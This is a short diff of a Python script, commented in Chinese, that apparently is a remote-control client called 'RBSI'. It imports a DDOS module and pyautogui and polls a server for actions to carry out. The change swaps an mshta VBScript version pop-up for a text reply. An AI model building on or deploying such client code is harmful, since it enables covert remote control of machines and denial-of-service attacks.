@@ -1,3 +1,5 @@
+# 该文件无需自定义
+
 import requests
 from socket import gethostname
 import subprocess
@@ -12,7 +14,6 @@ import pyautogui  # pip install pyautogui==0.9.50
 import DDOS
 
 # 全局变量初始化
-version = 1
 for i in range(1, 10):
     url = sys.argv[i]
     if url[:4] == "http":
@@ -107,13 +108,7 @@ while True:
                 raise SystemExit
 
             if response.get("show-version"):
-                send_message("展示版本执行...")
-
-                CmdTread(
-                    "mshta vbscript:msgbox(\"当前版本：%s\",64,\"RBSI版本\")(window.close)"
-                    % version)
-
-                send_message("展示版本成功!")
+                send_message("go_install版本不支持显示版本")
 
             action = response["action"]
             if response["actions"]:
